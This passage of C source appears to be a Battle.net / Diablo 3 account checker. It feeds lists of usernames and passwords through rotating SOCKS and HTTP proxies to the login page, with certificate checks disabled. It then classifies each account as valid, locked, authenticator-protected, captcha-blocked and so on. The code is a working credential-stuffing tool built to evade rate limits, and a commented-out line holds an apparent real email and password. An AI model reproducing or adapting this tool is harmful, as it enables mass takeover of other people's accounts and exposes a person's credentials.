        printf( "账号[%s] 登陆失败!!, 代理出现错误\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_UNSCAN_PROXY_ERROR_DIABLO3;
        pst_pi->n_state = MMSCAN_PROXYINFO_STATE_ERROR_DIABLO3;
        pst_param->aun_ai_again[pst_param->un_ai_again_count++] = pst_work_param->un_idx_accountinfo;
        break;
    case MMSCAN_WORK_PARAM_RESULT_OPERATION_TIMEOUT_ERROR:
        printf( "账号[%s] 登陆失败!!, 操作超时\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_UNSCAN_DIABLO3;
        pst_param->aun_ai_again[pst_param->un_ai_again_count++] = pst_work_param->un_idx_accountinfo;
        break;
    case MMSCAN_WORK_PARAM_RESULT_ERROR:
        printf( "账号[%s] 登陆失败!!, 内部错误\n", pst_ai->ac_account );
        pst_ai->n_state = MMSCAN_ACCOUNTINFO_STATE_UNSCAN_DIABLO3;
        pst_param->aun_ai_again[pst_param->un_ai_again_count++] = pst_work_param->un_idx_accountinfo;
        break;
    }
    /* printf( "diablo3 work for account[%s] proxy[%s][%d] is stopped\n", pst_ai->ac_account, pst_pi ? pst_pi->ac_ip : "no proxy", pst_pi ? (int)pst_pi->us_port : 0 ); */

    n_result = 1;
errorexit:
    return n_result;
}

int mmscan_diablo3_run( pmmscan pst_scan, void* p_param )
{
    int n_result = 0;
    pmmscan_work pst_workfree = NULL;
    pmmscan_work pst_workfinish = NULL;
    pmmscan_param_diablo3 pst_param = 0;
    unsigned int un_ai_idx = 0;
    unsigned int un_pi_idx = 0;
    unsigned int un_li_idx = 0;

    assert( pst_scan );
    assert( p_param );
    handle_error( pst_param = (pmmscan_param_diablo3)p_param );
    /* printf( "mmscan_diablo3_run\n" ); */
    if ( pst_param->un_ai_count_finish >= pst_param->un_ai_count )
    {
        handle_error( mmscan_stop( pst_scan ) );
    }
    while( mmscan_getfreeworkcount( pst_scan ) > 0 )
    {
        handle_error( _mmscan_param_diablo3_iteratelogingateinfo( pst_param, &un_li_idx ) );
        if ( -1 == un_li_idx )
        {
            handle_error( mmscan_stop( pst_scan ) );
            break;
        }

        handle_error( _mmscan_param_diablo3_iterateaccountinfo( pst_param, &un_ai_idx ) );
        if ( -1 == un_ai_idx )
        {
            break;
        }

        handle_error( _mmscan_param_diablo3_iterateproxyinfo( pst_param, &un_pi_idx ) );
        if ( -1 == un_pi_idx )
        {
            printf( "已经没有可用的代理，停止扫描!!\n" );
            handle_error( mmscan_stop( pst_scan ) );
            break;
        }

        handle_error( pst_workfree = mmscan_getfreework( pst_scan ) );
        handle_error( _mmscan_diablo3_process_freework( pst_scan, pst_param, pst_workfree, un_ai_idx, un_pi_idx, un_li_idx ) );
        handle_error( mmscan_startwork( pst_scan, pst_workfree ) );
        /* printf( "diablo3 work for account[%s] proxy[%s][%d] is started\n", pst_ai->ac_account, pst_pi ? pst_pi->ac_ip : "no proxy", pst_pi ? (int)pst_pi->us_port : 0 ); */
        pst_workfree = NULL;
    }

    while( mmscan_getfinishworkcount( pst_scan ) > 0 )
    {
        handle_error( pst_workfinish = mmscan_getfinishwork( pst_scan ) );
        handle_error( _mmscan_diablo3_process_finishwork( pst_scan, pst_param, pst_workfinish ) );
        handle_error( mmscan_stopwork( pst_scan, pst_workfinish ) );
        pst_workfinish = NULL;
    }
    Sleep( 100 );

    n_result = 1;
errorexit:
    if ( 0 == n_result )
    {
        mmscan_stop( pst_scan );
    }
    return n_result;
}

int mmscan_diablo3_beforerun( pmmscan pst_scan, void** pp_param, int argn, char** argv )
{
    int n_result = 0;
    pmmscan_param_diablo3 pst_param = NULL;
    const char* pcstr_account = NULL;
    const char* pcstr_proxy = NULL;
    const char* pcstr_logingate = NULL;
    const char* pcstr_httpproxy = NULL;

    assert( pst_scan );
    assert( pp_param );
    /* printf( "mmscan_diablo3_beforerun\n" ); */
    pcstr_account = "res/account_default.txt";
    pcstr_proxy = "res/proxy_default.txt";
    pcstr_logingate = "res/logingate_default.txt";
    pcstr_httpproxy = "res/httpproxy_default.txt";
    if ( argn >=2 )
    {
        pcstr_account = argv[1];
    }
    if ( argn >= 3 )
    {
        pcstr_proxy = argv[2];
    }
    if ( argn >= 4 )
    {
        pcstr_logingate = argv[3];
    }
    handle_error( pst_param = _mmscan_param_diablo3_create() );
    *pp_param = (void*)pst_param;
    handle_error( _mmscan_param_diablo3_initializedirectory( pst_param ) );
    handle_error( _mmscan_param_diablo3_loadaccountinfo( pst_param, pcstr_account ) );
    handle_error( _mmscan_param_diablo3_loadproxyinfo( pst_param, pcstr_proxy ) );
    handle_error( _mmscan_param_diablo3_loadhttpproxyinfo( pst_param, pcstr_httpproxy ) );
    handle_error( _mmscan_param_diablo3_loadlogingateinfo( pst_param, pcstr_logingate ) );
    handle_error( _mmscan_param_diablo3_loadlocalproxyinfo( pst_param ) );
    handle_error( pst_param->un_li_count > 0 );

    n_result = 1;
errorexit:
    return n_result;
}

int mmscan_diablo3_afterrun( pmmscan pst_scan, void* p_param )
{
    int n_result = 0;

    assert( pst_scan );
    /* printf( "mmscan_diablo3_afterrun\n" ); */
    if ( p_param )
    {
        _mmscan_param_diablo3_saveaccountinfo( (pmmscan_param_diablo3)p_param );
       _mmscan_param_diablo3_destroy( (pmmscan_param_diablo3)p_param );
        p_param = NULL;
    }

    n_result = 0;
    return 1;
}

static int _mmscan_diablo3_workrun( pmmscan pst_scan, void* p_param, void* p_extraspace, unsigned int un_workid )
{
    int n_result = 0;
    pmmscan_param_diablo3 pst_param = NULL;
    pmmscan_work_param_diablo3 pst_work_param = NULL;

    assert( pst_scan );
    assert( p_param );
    assert( p_extraspace );
    pst_param = (pmmscan_param_diablo3)p_param;
    pst_work_param = (pmmscan_work_param_diablo3)p_extraspace;
    handle_error( _mmscan_diablo3_scan( pst_scan, pst_param, pst_work_param, un_workid ) );

    n_result = 1;
errorexit:
    return n_result;
}

static int _mmscan_diablo3_scan( pmmscan pst_scan, pmmscan_param_diablo3 pst_param, pmmscan_work_param_diablo3 pst_work_param, unsigned int un_workid )
{
    int n_result = 0;
    pmmscan_accountinfo_diablo3 pst_ai = NULL;
    pmmscan_proxyinfo_diablo3 pst_pi = NULL;
    pmmscan_logingateinfo_diablo3 pst_li = NULL;
    CURL *curl = NULL;
    CURLcode res;
    FILE* pst_pagefile = NULL;
    FILE* pst_pageheaderfile = NULL;
    mmscan_writer_param_diabo3 c_param_page = { 0 };
    mmscan_writer_param_diabo3 c_param_pagehdr = { 0 };
    struct curl_slist* pst_header = NULL;
    char ac_headopt[256] = { 0 };
    char ac_login[256] = { 0 };
    char ac_loginhdr[256] = { 0 };
    char ac_loginresult[256] = { 0 };
    char ac_loginresulthdr[256] = { 0 };
    char ac_logincookie[256] = { 0 };
    char ac_loginresultcookie[256] = { 0 };
    int n_result_parse = 0;

    assert( pst_scan );
    assert( pst_param );
    handle_error( pst_li = _mmscan_param_diablo3_getlogingateinfo( pst_param, pst_work_param->un_idx_logingateinfo ) );
    handle_error( pst_ai = _mmscan_param_diablo3_getaccountinfo( pst_param, pst_work_param->un_idx_accountinfo ) );
    if ( -1 != pst_work_param->un_idx_proxyinfo )
    {
        handle_error( pst_pi = _mmscan_param_diablo3_getproxyinfo( pst_param, pst_work_param->un_idx_proxyinfo ) );
    }
    else
    {
        pst_pi = NULL;
    }
    /* printf( "diablo3 work 4 account[%s] proxy[%s][%d] is running\n",  pst_ai->ac_account, pst_pi ? pst_pi->ac_ip : "no proxy", pst_pi ? (int)pst_pi->us_port : 0 ); */
    printf( "扫描账号[%s] 代理[%s,%d] 登陆口[%s]\n", pst_ai->ac_account, pst_pi ? pst_pi->ac_ip : "no proxy", pst_pi ? (int)pst_pi->us_port : 0, pst_li->ac_loginurl );

    _snprintf( ac_login, 256, "%s/%s_%u_login.html", MMSCAN_DIRECTORY_RESULT, pst_ai->ac_account, un_workid );
    _snprintf( ac_loginhdr, 256, "%s/%s_%u_loginhdr.txt", MMSCAN_DIRECTORY_RESULT, pst_ai->ac_account, un_workid );
    _snprintf( ac_loginresult, 256, "%s/%s_%u_loginresult.html", MMSCAN_DIRECTORY_RESULT, pst_ai->ac_account, un_workid );
    _snprintf( ac_loginresulthdr, 256, "%s/%s_%u_loginresulthdr.txt", MMSCAN_DIRECTORY_RESULT, pst_ai->ac_account, un_workid );
    _snprintf( ac_logincookie, 256, "%s/%s_%u_logincookie.txt", MMSCAN_DIRECTORY_RESULT, pst_ai->ac_account, un_workid );
    _snprintf( ac_loginresultcookie, 256, "%s/%s_%u_loginresultcookie.txt", MMSCAN_DIRECTORY_RESULT, pst_ai->ac_account, un_workid );

    handle_error( _mmscan_param_diablo3_rmfile( pst_param, ac_logincookie ) );
    handle_error( _mmscan_param_diablo3_rmfile( pst_param, ac_loginresultcookie ) );

    handle_error( curl = curl_easy_init() );
    sprintf( ac_headopt, "Host: %s", pst_li->ac_loginhost );
    handle_error( pst_header = curl_slist_append( pst_header, ac_headopt ) );
    handle_error( pst_header = curl_slist_append( pst_header, "Connection: keep-alive" ) );
    handle_error( pst_header = curl_slist_append( pst_header, "User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5" ) );
    handle_error( pst_header = curl_slist_append( pst_header, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ) );
    handle_error( pst_header = curl_slist_append( pst_header, "Accept-Encoding: deflate" ) );
    handle_error( pst_header = curl_slist_append( pst_header, "Accept-Language: en-US,en;q=0.8" ) );
    handle_error( pst_header = curl_slist_append( pst_header, "Accept-Charset: utf-8;q=0.7,*;q=0.3" ) );

#if 0
    handle_error( pst_pagefile = fopen( ac_login, "wb" ) );
    handle_error( pst_pageheaderfile = fopen( ac_loginhdr, "wb" ) );
#endif
    c_param_page.pst_file = pst_pagefile;
    c_param_page.un_len = 0;
    c_param_pagehdr.pst_file = pst_pageheaderfile;
    c_param_pagehdr.un_len = 0;
    _snprintf( ac_headopt, 256, "%s", pst_li->ac_loginurl );
    curl_easy_setopt( curl, CURLOPT_URL, ac_headopt );
    curl_easy_setopt( curl, CURLOPT_HTTPHEADER, pst_header );
    curl_easy_setopt( curl, CURLOPT_HEADERFUNCTION, _mmscan_diablo3_scan_pageheaderwriter );
    curl_easy_setopt( curl, CURLOPT_WRITEFUNCTION, _mmscan_diablo3_scan_pagewriter );
    curl_easy_setopt( curl, CURLOPT_WRITEDATA, &c_param_page );
    curl_easy_setopt( curl, CURLOPT_HEADERDATA, &c_param_pagehdr );
    curl_easy_setopt( curl, CURLOPT_SSL_VERIFYPEER, 0 );
    curl_easy_setopt( curl, CURLOPT_SSL_VERIFYHOST, 0 );
    curl_easy_setopt( curl, CURLOPT_FOLLOWLOCATION, 1 );
    curl_easy_setopt( curl, CURLOPT_COOKIEJAR, ac_logincookie );   // 设置从$cookie所指文件中读取cookie信息以发送
    curl_easy_setopt( curl, CURLOPT_COOKIEFILE, ac_logincookie );   // 设置将返回的cookie保存到$cookie所指文件
    curl_easy_setopt( curl, CURLOPT_TIMEOUT, 30 ); 
    curl_easy_setopt( curl, CURLOPT_CONNECTTIMEOUT, 30 );
    curl_easy_setopt( curl, CURLOPT_VERBOSE, 0 );
    if ( pst_pi )
    {
        if ( pst_pi->n_type == MMSCAN_PROXYINFO_TYPE_PROXY )
        {
            curl_easy_setopt( curl, CURLOPT_PROXY, pst_pi->ac_ip );
            curl_easy_setopt( curl, CURLOPT_PROXYPORT, pst_pi->us_port );
            curl_easy_setopt( curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5 );
            /* curl_easy_setopt( curl, CURLOPT_PROXYUSERNAME, "username" ); */
            /* curl_easy_setopt( curl, CURLOPT_PROXYUSERPWD, "password" ); */
        }
        else if ( pst_pi->n_type == MMSCAN_PROXYINFO_TYPE_HTTPPROXY )
        {
            curl_easy_setopt( curl, CURLOPT_PROXY, pst_pi->ac_ip );
            curl_easy_setopt( curl, CURLOPT_PROXYPORT, pst_pi->us_port );
            curl_easy_setopt( curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP );
            if ( strlen( pst_pi->ac_username ) > 0 && strlen( pst_pi->ac_password ) > 0 )
            {
                curl_easy_setopt( curl, CURLOPT_PROXYUSERNAME,  pst_pi->ac_username );
                curl_easy_setopt( curl, CURLOPT_PROXYUSERPWD, pst_pi->ac_password );
            }
        }
        else if ( pst_pi->n_type = MMSCAN_PROXYINFO_TYPE_LOCAL )
        {
            curl_easy_setopt( curl, CURLOPT_INTERFACE, pst_pi->ac_ip );
        }
    }
    res = curl_easy_perform(curl);
#if 0
    fclose( pst_pagefile );
    fclose( pst_pageheaderfile );
#endif
    if ( CURLE_OK != res )
    {
        if ( CURLE_COULDNT_CONNECT == res || CURLE_COULDNT_RESOLVE_HOST == res || CURLE_COULDNT_RESOLVE_PROXY == res )
        {
            pst_work_param->n_result = MMSCAN_WORK_PARAM_RESULT_PROXY_ERROR;
            handle_succ( 1 );
        }
        if ( CURLE_OPERATION_TIMEDOUT == res )
        {
            pst_work_param->n_result = MMSCAN_WORK_PARAM_RESULT_OPERATION_TIMEOUT_ERROR;
            handle_succ( 1 );
        }
        if ( CURLE_INTERFACE_FAILED == res )
        {
            pst_work_param->n_result = MMSCAN_WORK_PARAM_RESULT_PROXY_ERROR;
            handle_succ( 1 );
        }
        printf( "扫描出现未知错误,错误号:%d\n", res );
        handle_error( 1 );
    }
    n_result_parse = _mmscan_diablo3_parse_pagelogin( c_param_page.ac_buffer, c_param_page.un_len );
    if ( n_result_parse != MMSCAN_WORK_PARAM_RESULT_OK )
    {
        pst_work_param->n_result = n_result_parse;
        handle_succ( 1 );
    }

#if 0
    handle_error( pst_pagefile = fopen( ac_loginresult, "wb" ) );
    handle_error( pst_pageheaderfile = fopen( ac_loginresulthdr, "wb" ) );
#endif
    c_param_page.pst_file = pst_pagefile;
    c_param_page.un_len = 0;
    c_param_pagehdr.pst_file = pst_pageheaderfile;
    c_param_pagehdr.un_len = 0;
    _snprintf( ac_headopt, 256, "%s?ref=&app=", pst_li->ac_loginurl );
    /* curl_easy_setopt(curl, CURLOPT_URL, "https://tw.battle.net/login/zh/?ref=&app="); */
    curl_easy_setopt( curl, CURLOPT_URL, ac_headopt );
    curl_easy_setopt( curl, CURLOPT_HTTPHEADER, pst_header );
    _snprintf( ac_headopt, 256, "accountName=%s&password=%s", pst_ai->ac_account, pst_ai->ac_password );
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, ac_headopt );
    /* curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "accountName=chamzzzzzz@gmail.com&password=1iuchen**5201314"); */
    curl_easy_setopt( curl, CURLOPT_HEADERFUNCTION, _mmscan_diablo3_scan_pageheaderwriter );
    curl_easy_setopt( curl, CURLOPT_WRITEFUNCTION, _mmscan_diablo3_scan_pagewriter );
    curl_easy_setopt( curl, CURLOPT_WRITEDATA, &c_param_page );
    curl_easy_setopt( curl, CURLOPT_HEADERDATA, &c_param_pagehdr );
    curl_easy_setopt( curl, CURLOPT_SSL_VERIFYPEER, 0 );
    curl_easy_setopt( curl, CURLOPT_SSL_VERIFYHOST, 0 );
    curl_easy_setopt( curl, CURLOPT_FOLLOWLOCATION, 1 );
    curl_easy_setopt( curl, CURLOPT_COOKIEJAR, ac_loginresultcookie );   // 设置从$cookie所指文件中读取cookie信息以发送
    curl_easy_setopt( curl, CURLOPT_COOKIEFILE, ac_loginresultcookie );   // 设置将返回的cookie保存到$cookie所指文件
    curl_easy_setopt( curl, CURLOPT_TIMEOUT, 30 );
    curl_easy_setopt( curl, CURLOPT_CONNECTTIMEOUT, 30 );
    curl_easy_setopt( curl, CURLOPT_VERBOSE, 0 );
    if ( pst_pi )
    {
        if ( pst_pi->n_type == MMSCAN_PROXYINFO_TYPE_PROXY )
        {
            curl_easy_setopt( curl, CURLOPT_PROXY, pst_pi->ac_ip );
            curl_easy_setopt( curl, CURLOPT_PROXYPORT, pst_pi->us_port );
            curl_easy_setopt( curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5 );
            /* curl_easy_setopt( curl, CURLOPT_PROXYUSERNAME, "username" ); */
            /* curl_easy_setopt( curl, CURLOPT_PROXYUSERPWD, "password" ); */
        }
        else if ( pst_pi->n_type == MMSCAN_PROXYINFO_TYPE_HTTPPROXY )
        {
            curl_easy_setopt( curl, CURLOPT_PROXY, pst_pi->ac_ip );
            curl_easy_setopt( curl, CURLOPT_PROXYPORT, pst_pi->us_port );
            curl_easy_setopt( curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP );
            if ( strlen( pst_pi->ac_username ) > 0 && strlen( pst_pi->ac_password ) > 0 )
            {
                curl_easy_setopt( curl, CURLOPT_PROXYUSERNAME,  pst_pi->ac_username );
                curl_easy_setopt( curl, CURLOPT_PROXYUSERPWD, pst_pi->ac_password );
            }
        }
        else if ( pst_pi->n_type == MMSCAN_PROXYINFO_TYPE_LOCAL )
        {
            curl_easy_setopt( curl, CURLOPT_INTERFACE, pst_pi->ac_ip );
        }
    }
    res = curl_easy_perform(curl);
#if 0
    fclose( pst_pagefile );
    fclose( pst_pageheaderfile );
#endif
    if ( CURLE_OK != res )
    {
        if ( CURLE_COULDNT_CONNECT == res || CURLE_COULDNT_RESOLVE_HOST == res || CURLE_COULDNT_RESOLVE_PROXY == res )
        {
            pst_work_param->n_result = MMSCAN_WORK_PARAM_RESULT_PROXY_ERROR;
            handle_succ( 1 );
        }
        if ( CURLE_OPERATION_TIMEDOUT == res )
        {
            pst_work_param->n_result = MMSCAN_WORK_PARAM_RESULT_OPERATION_TIMEOUT_ERROR;
            handle_succ( 1 );
        }
        if ( CURLE_INTERFACE_FAILED == res )
        {
            pst_work_param->n_result = MMSCAN_WORK_PARAM_RESULT_PROXY_ERROR;
            handle_succ( 1 );
        }
        printf( "扫描出现未知错误,错误号:%d\n", res );
        handle_error( 1 );
    }
    n_result_parse = _mmscan_diablo3_parse_pageloginresult( c_param_page.ac_buffer, c_param_page.un_len );
    if ( n_result_parse == MMSCAN_WORK_PARAM_RESULT_ERROR )
    {
        printf( "账号[%s]的返回数据出现异常\n", pst_ai->ac_account );
    }
    if ( n_result_parse != MMSCAN_WORK_PARAM_RESULT_OK )
    {
        pst_work_param->n_result = n_result_parse;
        handle_succ( 1 );
    }
    pst_work_param->n_result = n_result_parse;

succexit:
    n_result = 1;
errorexit:
    if ( curl )
    {
        curl_easy_cleanup(curl);
        curl = NULL;
    }
    _mmscan_param_diablo3_rmfile( pst_param, ac_logincookie );
    _mmscan_param_diablo3_rmfile( pst_param, ac_loginresultcookie );
    return n_result;
}

static int _mmscan_diablo3_parse_pagelogin( const char* pcstr_page, unsigned int un_len )
{
    int n_result = MMSCAN_WORK_PARAM_RESULT_ERROR;
    const char* pcstr_securitycode = "For security reasons, enter the characters you see in the image. This is not your password.";

    assert( pcstr_page );
    if ( strstr( pcstr_page, pcstr_securitycode ) )
    {
        n_result = MMSCAN_WORK_PARAM_RESULT_SECURITYCODE_ERROR;
    }
    else
    {
        n_result = MMSCAN_WORK_PARAM_RESULT_OK;
    }

    return n_result;
}

static int _mmscan_diablo3_parse_pageloginresult( const char* pcstr_page, unsigned int un_len )
{
    int n_result = MMSCAN_WORK_PARAM_RESULT_ERROR;
    const char* pcstr_passwd = "Password invalid.";
    const char* pcstr_passwd1 = "The username or password is incorrect. Please try again";
    const char* pcstr_lock = "Due to suspicious activity, this account has been locked. A message has been sent to";
    const char* pcstr_auth = "Authenticator Detected";
    const char* pcstr_succ1 = "Account Details";
    const char* pcstr_succ2 = "Your Game Accounts";
    const char* pcstr_securitecode = "Wrong characters entered. Please try again";
    const char* pcstr_validation1 = "Account Creation";
    const char* pcstr_validation2 = "Personal Validation";
    const char* pcstr_agreement1 = "Terms of Use Agreement";
    const char* pcstr_agreement2 = "Agreement of Personal Information Protection and Privacy Policy";

    assert( pcstr_page );
    if ( strstr( pcstr_page, pcstr_securitecode ) )
    {
        n_result = MMSCAN_WORK_PARAM_RESULT_SECURITYCODE_ERROR;
        handle_succ( 1 );
    }
    if ( strstr( pcstr_page, pcstr_passwd ) )
    {
        n_result = MMSCAN_WORK_PARAM_RESULT_USERPASS_ERROR;
        handle_succ( 1 );
    }
    if ( strstr( pcstr_page, pcstr_passwd1 ) )
    {
        n_result = MMSCAN_WORK_PARAM_RESULT_USERPASS_ERROR;
        handle_succ( 1 );
    }
    if ( strstr( pcstr_page, pcstr_lock ) )
    {
        n_result = MMSCAN_WORK_PARAM_RESULT_LOCK_ERROR;
        handle_succ( 1 );
    }
    if ( strstr( pcstr_page, pcstr_auth ) )
    {
        n_result = MMSCAN_WORK_PARAM_RESULT_AUTH_ERROR;
        handle_succ( 1 );
    }
    if ( strstr( pcstr_page, pcstr_succ1 ) && strstr( pcstr_page, pcstr_succ2 ) )
    {
        n_result = MMSCAN_WORK_PARAM_RESULT_OK;
        handle_succ( 1 );
    }
    if ( strstr( pcstr_page, pcstr_validation1 ) && strstr( pcstr_page, pcstr_validation2 ) )
    {
        n_result = MMSCAN_WORK_PARAM_RESULT_VALIDATION_ERROR;
        handle_succ( 1 );
    }
    if ( strstr( pcstr_page, pcstr_agreement1 ) && strstr( pcstr_page, pcstr_agreement2 ) )
    {
        n_result = MMSCAN_WORK_PARAM_RESULT_AGREEMENT_ERROR;
        handle_succ( 1 );
    }
    n_result = MMSCAN_WORK_PARAM_RESULT_UNKNOWN_ERROR;

succexit:
    if ( MMSCAN_WORK_PARAM_RESULT_ERROR == n_result )
    {
        printf( "网站返回登录结果网页内容格式有问题。。\n" );
        printf( "网页数据长度:%u\n", un_len );
        //printf( "网页数据内容:%s\n", pcstr_page );
    }
    return n_result;
}

static size_t _mmscan_diablo3_scan_pagewriter( void* p_data, size_t size, size_t nmemb, void* userp )
{
    pmmscan_writer_param_diabo3 pst_param = NULL;

    assert( userp );
    pst_param = (pmmscan_writer_param_diabo3)userp;
    assert( pst_param->un_len + size * nmemb <= MMSCAN_WRITER_PARAM_BUFFER_LEN );
    /* assert( pst_param->pst_file ); */
    /* fwrite( p_data, nmemb, size, pst_param->pst_file ); */
    memcpy( pst_param->ac_buffer + pst_param->un_len, p_data, nmemb * size );
    pst_param->un_len += size * nmemb;

    return size * nmemb;
}

static size_t _mmscan_diablo3_scan_pageheaderwriter( void* p_data, size_t size, size_t nmemb, void* userp )
{
    pmmscan_writer_param_diabo3 pst_param = NULL;

    assert( userp );
    pst_param = (pmmscan_writer_param_diabo3)userp;
    /* assert( pst_param->pst_file ); */
    assert( pst_param->un_len + size * nmemb <= MMSCAN_WRITER_PARAM_BUFFER_LEN );
    /* fwrite( p_data, nmemb, size, pst_param->pst_file ); */
    memcpy( pst_param->ac_buffer + pst_param->un_len, p_data, nmemb * size );
    pst_param->un_len += size * nmemb;

    return size * nmemb;
}